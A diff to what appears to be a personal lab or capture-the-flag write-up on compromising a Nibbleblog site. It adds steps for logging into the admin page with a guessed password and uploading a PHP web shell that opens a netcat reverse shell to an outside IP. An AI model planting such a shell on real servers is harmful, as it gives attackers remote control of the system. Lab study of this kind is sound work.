@@ -78,7 +78,19 @@ Documentation: http://docs.nibbleblog.com
 
 ### Go to login page at `/admin`
 ![[Pasted image 20260818000229.png]]
-- `config.xml` found in `/content/private` and the output of the xml showed that the email used was `admin@nibbles.com` 
+- `config.xml` found in `/content/private` and the output of the xml showed that the email used was `admin@nibbles.com` so we use nibbles to login
+
+#### Go to this page and upload a shell
+![[Pasted image 20260818000500.png]]
+
+#### Shell.php
+```bash
+<?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.27 9001 >/tmp/f'); ?>
+```
+
+
+
+
 ## Techniques used
 
 
